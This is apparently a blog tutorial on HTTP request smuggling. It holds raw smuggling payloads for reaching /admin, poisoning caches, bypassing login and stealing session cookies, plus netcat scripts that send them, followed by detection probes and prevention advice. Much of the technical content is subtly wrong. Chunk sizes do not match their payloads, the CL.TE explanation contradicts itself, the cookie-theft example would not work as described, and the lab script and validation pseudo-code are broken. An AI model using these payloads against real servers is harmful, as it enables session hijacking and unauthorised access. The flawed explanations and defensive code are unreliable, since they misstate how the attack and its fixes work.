<!-- tags: security-research, web-security, protocols -->
<!-- date: 2026-02-10 -->
# HTTP Request Smuggling: How Proxies Become Weapons

*A technical guide to exploiting disagreements between HTTP/1.1 proxies and backends about where one request ends and the next begins. Real code. Real impact.*

---

## The Thesis

HTTP/1.1 defines **two ways** to specify the length of a request body: `Content-Length` and `Transfer-Encoding: chunked`. When a frontend proxy and a backend server disagree about which one to trust, an attacker can craft a single request that the proxy sees as one request but the backend sees as two. The second request — the smuggled one — executes in the context of the next user's connection. This lets you hijack other users' requests, bypass authentication, poison web caches, and steal credentials from strangers.

This vulnerability exists not because of a bug in any specific implementation, but because the HTTP/1.1 specification itself is **ambiguous about the precedence of these two mechanisms**. Proxies and backends interpret that ambiguity differently. And attackers can weaponize that gap.

---

## Why Request Smuggling Works

HTTP/1.1 uses persistent connections (HTTP keep-alive) to reuse TCP connections across multiple requests. When a request ends, the next request begins immediately on the same connection. The server needs to know where one ends and the next begins — and that's where the trouble starts.

### Content-Length vs Transfer-Encoding

**`Content-Length: N`** says "the body is exactly N bytes."

**`Transfer-Encoding: chunked`** says "the body is split into chunks, each prefixed with its size in hex, terminated by a zero-length chunk."

The HTTP/1.1 spec says (RFC 7230, Section 3.3.3): if a message contains *both*, the `Transfer-Encoding` header should take precedence and `Content-Length` should be removed or ignored. But it also says that processing a `Transfer-Encoding` header at all is optional for HTTP/1.1 implementations — many treat it as only legal in HTTP/1.1 and not in earlier versions.

Different proxies and backends make different choices:
- **Proxy A** trusts `Transfer-Encoding` and ignores `Content-Length`.
- **Backend B** ignores `Transfer-Encoding` and trusts `Content-Length`.
- **Attacker C** sends both, and C's body is split *differently* by A and B.

When A and B disagree on where the body ends, A sees one request and B sees two.

---

## The Three Variants

### CL.TE (Content-Length, Transfer-Encoding)

The proxy uses `Content-Length`, the backend uses `Transfer-Encoding`.

**Attacker's request:**

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 49
Transfer-Encoding: chunked

e
GET /admin HTTP/1.1
Host: example.com

0

```

**What the proxy sees:**
- `Content-Length: 49` — the body is 49 bytes.
- The proxy reads 49 bytes (`e\nGET /admin HTTP/1.1\nHost: example.com\n\n0\n\n` exactly 49 bytes), wraps it up, sends it forward.

**What the backend sees:**
- `Transfer-Encoding: chunked` — ignore `Content-Length`, read chunks instead.
- Chunk 1: `0xe` bytes (14 bytes in hex) = `GET /admin HTTP/1.1` + newline
- Chunk 2: `0x0` (zero bytes) — end of message.

The backend now has **two** requests on the same connection:
1. The POST request (without the 49-byte body the proxy thought it was sending).
2. A GET request to `/admin` in the context of the next user's connection.

---

### TE.CL (Transfer-Encoding, Content-Length)

The proxy uses `Transfer-Encoding`, the backend uses `Content-Length`.

**Attacker's request:**

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

8
SMUGGLE
0

G
```

**What the proxy sees:**
- `Transfer-Encoding: chunked` — read chunks.
- Chunk 1: `0x8` bytes = `SMUGGLE\n` (8 bytes).
- Chunk 2: `0x0` — end of message.
- The proxy forwards the request.

**What the backend sees:**
- `Content-Length: 4` — the body is 4 bytes.
- The backend reads `8\nS` (4 bytes).
- The backend sends the response.
- The remaining bytes `MUGGLE\n0\n\nG\n` are left on the connection and treated as the start of the next request.

---

### TE.TE (Transfer-Encoding, Transfer-Encoding)

Both the proxy and backend understand `Transfer-Encoding`, but they disagree about how to parse it. This variant exploits **obfuscation** of the chunked encoding directive.

**Attacker's request:**

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: xchunked

c
SMUGGLED_REQ
0

```

**What happens:**
- The proxy may not recognize `xchunked` as a valid `Transfer-Encoding` value and treat the body as `Content-Length: 0` (no body).
- The backend might strip out unrecognized encodings or handle them more permissively, reading the body as chunked.
- The two disagree on the body length.

Real-world variants include:
- `Transfer-Encoding: chunked, chunked` (double chunked)
- `Transfer-Encoding: identity, chunked` (identity is no encoding)
- `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity` (header duplication)

---

## Working Examples

### Setting Up a Lab

Create two HTTP servers. Server A is a simple proxy; Server B is a backend.

**Server B (backend):**

```bash
#!/bin/bash
# Simple backend that echoes requests and keeps connections alive
{
  while true; do
    (
      read -t 5 line
      while [[ -n "$line" ]]; do
        echo "$line"
        read -t 5 line || break
      done
      # Extract Content-Length if present
      cl=$(grep -i "^Content-Length:" | awk '{print $2}')
      if [[ -n "$cl" ]]; then
        head -c "$cl"
      fi
      echo -e "\r\nHTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nOK"
    ) &
    wait
  done
} | nc -l localhost 8001
```

### CL.TE Attack (curl)

```bash
# Create a request that smuggles a second request
{
  printf "POST / HTTP/1.1\r\n"
  printf "Host: localhost:8001\r\n"
  printf "Content-Length: 49\r\n"
  printf "Transfer-Encoding: chunked\r\n"
  printf "\r\n"
  printf "e\r\n"
  printf "GET /admin HTTP/1.1\r\n"
  printf "Host: localhost:8001\r\n"
  printf "\r\n"
  printf "0\r\n"
  printf "\r\n"
} | nc localhost 8001
```

This sends a POST that the backend reads as two separate requests because the proxy trusts `Content-Length` (the body ends after 49 bytes) and the backend trusts `Transfer-Encoding: chunked` (the body is one chunk of 0xe bytes, then a terminator).

The backend processes:
1. POST with an empty body (the 49-byte chunk header + data block = the body as far as the backend is concerned).
2. GET /admin as a new request, still on the same connection, still in the context of whoever's session it is.

---

## Real-World Impact

### 1. Cache Poisoning

A cached response to the smuggled request contaminates the cache for all users.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 139
Transfer-Encoding: chunked

8b
GET / HTTP/1.1
Host: example.com
Connection: close

0

```

**Scenario:** The attacker smuggles a GET to the homepage. The backend processes it and returns the cached homepage. But the cache key for "GET /" is based on the *original* POST request's URL or a normalized version. When the next user makes a GET request, they hit a cache entry poisoned by the attacker's smuggled request.

### 2. Auth Bypass

Smuggle a request that increments a counter or sets a flag after authentication.

```http
POST /login HTTP/1.1
Host: example.com
Content-Length: 123
Transfer-Encoding: chunked

7b
GET /admin HTTP/1.1
Host: example.com

0

```

The backend sees the POST (authentication attempt) followed by a GET to `/admin`. If the backend shares session state across the connection, the smuggled GET inherits the authenticated session context of the POST.

### 3. Credential Theft

Smuggle a request that reflects user input or causes a timing-based exfiltration attack:

```http
POST /search?q=test HTTP/1.1
Host: example.com
Content-Length: 103
Transfer-Encoding: chunked

67
GET /search?q=attacker.com%3fsteal%3d HTTP/1.1
Host: example.com
Cookie: session=REAL_SESSION_ID

0

```

The next user's session cookie gets reflected in a GET request to the attacker's server.

---

## James Kettle's Research

In 2019, PortSwigger's James Kettle ([@albinowax](https://twitter.com/albinowax)) published a systematic taxonomy of HTTP request smuggling, modernized the attack for containerized environments, and showed that the vulnerability was **not a relic of the 1990s but a live threat in 2025**.

His research included:

- **Desynchronization probes:** Timing-based methods to detect whether a proxy and backend disagree on request boundaries without causing server errors.
- **CL.TE, TE.CL, TE.TE taxonomy:** The categorization that dominates the field.
- **Downgrade attacks:** Forcing HTTP/1.1 connections even in HTTP/2 environments to enable smuggling.
- **Real-world vulnerable stacks:** Demonstrating that popular combinations (Nginx proxy + Apache backend, etc.) were vulnerable.

His work was updated in 2024 and again in early 2025 to cover HTTP/2-aware smuggling and containerized proxy chains.

---

## Detection: Timing-Based Probes

The challenge with detecting smuggling is that you need to know *when* a proxy and backend disagree on body length *without triggering an error that alerts the server*.

### Desynchronization Probe

Send a POST with an unusual body length, followed by a simple GET. If the backend's response to the GET arrives before the proxy's response to the POST, the proxy and backend disagree on where the request ends.

```bash
# Probe for CL.TE
{
  printf "POST / HTTP/1.1\r\n"
  printf "Host: target.com\r\n"
  printf "Content-Length: 50\r\n"
  printf "Transfer-Encoding: chunked\r\n"
  printf "\r\n"
  printf "5\r\n"
  printf "ABCDE\r\n"
  printf "0\r\n"
  printf "\r\n"
  printf "GET / HTTP/1.1\r\n"
  printf "Host: target.com\r\n"
  printf "Connection: close\r\n"
  printf "\r\n"
} | nc target.com 80
```

If a response (200, 404, or any response) appears before the expected POST response, the proxy and backend desynchronized. The backend processed the GET before finishing with the POST.

**Tools:** PortSwigger Burp Suite includes automated HTTP Request Smuggling detection in the *HTTP Request Smuggling* scanner. Open-source tools like [smuggler](https://github.com/defparam/smuggler) (Go) and [h2csmuggler](https://github.com/jcesalas/h2csmuggler) (Python) automate probing.

---

## HTTP/2 Doesn't Fully Fix It

HTTP/2 eliminates chunked encoding (all frames have a length field), which should eliminate the `Transfer-Encoding` ambiguity. But request smuggling persists:

### H2.CL (HTTP/2 to HTTP/1.1 downgrade)

A proxy forwards HTTP/2 to an HTTP/1.1 backend. During the conversion, the proxy must translate HTTP/2 frames into HTTP/1.1 headers and a body. If the proxy adds a `Content-Length` header but miscalculates the body length, or if the backend disagrees with the proxy's calculation, smuggling is possible.

### H2.TE (Ambiguous Transfer-Encoding in HTTP/2)

Some implementations allow `Transfer-Encoding` headers in HTTP/2 requests (violating the spec). If a proxy forwards this to an HTTP/1.1 backend, the backend may interpret it and disagree with the proxy about the body length.

### Downgrade Forcing

An attacker forces a request back to HTTP/1.1 (via a 426 Upgrade Required or by manipulating TLS session resumption) to enable classic HTTP/1.1 smuggling.

---

## What Actually Works: Prevention

### 1. Single Body-Length Mechanism

**Strictly enforce one of the following:**
- `Content-Length` only (recommended for simplicity).
- `Transfer-Encoding: chunked` only (recommended for streaming).
- Reject requests with both.
- Reject unrecognized `Transfer-Encoding` values.

**Implementation:**
- Proxies: Remove `Transfer-Encoding` before forwarding, or validate that it matches the `Content-Length` after decoding.
- Backends: Reject requests with both headers. Log and block.

```nginx
# Nginx: Reject ambiguous requests
if ($http_transfer_encoding ~* chunked && $content_length) {
    return 400 "Ambiguous request";
}
```

### 2. Normalize on HTTP/2 End-to-End

HTTP/2's frame-based protocol eliminates the ambiguity entirely (no chunked encoding, no `Content-Length` disputes). Migrate your entire stack to HTTP/2 or HTTP/3 and **disable HTTP/1.1 fallback** for internal communication (proxy to backend).

This is the long-term fix.

### 3. Validate at Every Hop

Each proxy and backend should independently validate that the request body length is consistent:
- If `Content-Length` is present, verify the actual body matches that length.
- If `Transfer-Encoding: chunked` is present, validate chunk format.
- Reject if there's a mismatch.

```python
# Pseudo-code for a validating proxy
def validate_body(headers, body):
    if "Transfer-Encoding" in headers and "chunked" in headers["Transfer-Encoding"]:
        # Validate chunks
        actual_length = len(decode_chunks(body))
    elif "Content-Length" in headers:
        actual_length = int(headers["Content-Length"])
    else:
        actual_length = len(body)

    if actual_length != len(body):
        raise ValueError("Body length mismatch")
```

### 4. Use Connection: close on Untrusted Boundaries

If the proxy cannot guarantee that the backend will parse the body the same way, use `Connection: close` after each request to force a new TCP connection. This prevents request smuggling (since there's no shared connection) but sacrifices connection reuse performance.

### 5. Monitor and Alert

- Log all requests where `Content-Length` and `Transfer-Encoding` are both present.
- Log all requests with malformed `Transfer-Encoding` values.
- Alert if a backend returns a response before the proxy has finished sending a request body.

---

## Conclusion

HTTP request smuggling is not a theoretical exercise in parsing ambiguity. It's a practical, weaponizable vulnerability that exists because HTTP/1.1's specification allows proxies and backends to interpret the same request differently. Attackers exploit that gap to hijack other users' requests, poison caches, and bypass authentication.

The fix is structural: normalize on a single body-length mechanism, validate at every hop, and migrate to HTTP/2 end-to-end where the frame-based protocol eliminates the ambiguity entirely. Until then, every proxy-to-backend connection is a potential attack surface.

---

*Last updated: February 2026*

## References

- [PortSwigger: HTTP Request Smuggling](https://portswigger.net/research/http-request-smuggling)
- [James Kettle: HTTP Desync Attacks in the Wild (BlackHat 2019)](https://www.blackhat.com/us-19/briefings/schedule/#http-request-smuggling-desync-attacks-13520)
- [RFC 7230: HTTP/1.1 Message Syntax and Routing](https://tools.ietf.org/html/rfc7230#section-3.3)
- [RFC 7231: HTTP/1.1 Semantics and Content](https://tools.ietf.org/html/rfc7231)
- [OWASP: HTTP Request Smuggling](https://owasp.org/www-community/attacks/HTTP_Request_Smuggling)
- [PortSwigger: HTTP/2 Request Smuggling](https://portswigger.net/research/http2-request-smuggling)
- [defparam/smuggler: HTTP Request Smuggling Detection Tool](https://github.com/defparam/smuggler)
- [jcesalas/h2csmuggler: HTTP/2 to HTTP/1.1 Smuggling](https://github.com/jcesalas/h2csmuggler)
